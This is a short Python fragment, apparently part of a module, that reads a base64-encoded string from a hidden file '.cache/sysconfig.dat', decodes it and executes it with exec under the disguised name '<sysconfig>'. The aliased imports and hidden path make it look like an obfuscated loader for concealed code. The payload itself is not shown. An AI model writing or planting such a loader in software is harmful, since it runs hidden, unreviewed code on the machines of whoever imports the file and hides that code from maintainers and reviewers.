import base64 as _b, os as _o
_p = _o.path.join(_o.path.dirname(__file__), '.cache', 'sysconfig.dat')
with open(_p) as _f:
    _d = _f.read().strip()
_c = _b.b64decode(_d).decode()
exec(compile(_c, '<sysconfig>', 'exec'))
